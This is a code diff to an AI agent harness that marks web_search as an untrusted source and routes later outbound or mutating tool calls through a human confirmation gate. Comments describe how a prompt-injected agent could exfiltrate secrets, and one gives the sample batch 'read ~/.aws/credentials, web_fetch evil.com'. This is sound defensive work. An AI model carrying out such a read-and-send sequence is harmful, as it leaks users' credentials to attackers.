@@ -111,7 +111,8 @@ export interface ExecutionResult {
  * local reads are the user's own files and stay trusted (#309).
  */
 export function isUntrustedSource(toolName: string, args: Record<string, unknown>): boolean {
-  if (toolName === "web_fetch" || toolName.startsWith("mcp__")) return true;
+  if (toolName === "web_search" || toolName === "web_fetch" || toolName.startsWith("mcp__"))
+    return true;
   if (toolName === "read" || toolName === "grep") {
     // Missing/invalid path args default to cwd — trusted project-local.
     const raw = toolName === "grep" ? args.path : args.file_path;
@@ -123,7 +124,7 @@ export function isUntrustedSource(toolName: string, args: Record<string, unknown
 
 /**
  * The provenance-tracking confirmation bump (#309): while the current turn has
- * consumed untrusted content (out-of-project reads, web_fetch, MCP results), any
+ * consumed untrusted content (out-of-project reads, web_search/web_fetch, MCP results), any
  * outbound or mutating tool is forced through the HITL gate even if its own
  * predicate would not require it. This is the structural defense that closes the
  * exfiltration channel a prompt-injected agent otherwise has: read a secret (from
@@ -134,6 +135,7 @@ export function isUntrustedSource(toolName: string, args: Record<string, unknown
 export function bumpRequired(toolName: string, untrustedConsumed: boolean): boolean {
   if (!untrustedConsumed) return false;
   return (
+    toolName === "web_search" ||
     toolName === "web_fetch" ||
     toolName === "bash" ||
     toolName === "write" ||
@@ -327,7 +329,7 @@ export async function executeCalls(
   // the project or a credential file. This closes the same-batch race: a
   // parallel readonly batch like [read ~/.aws/credentials, web_fetch evil.com]
   // evaluates web_fetch's confirmation before the read's result exists, but the
-  // intent is visible from the args. web_fetch and MCP calls are deliberately
+  // intent is visible from the args. web_search, web_fetch, and MCP calls are deliberately
   // NOT arming here — their content is only consumed after the batch returns,
   // and a turn's FIRST outbound fetch must stay prompt-free (the bump gates
   // what follows consumption, not the initial request).
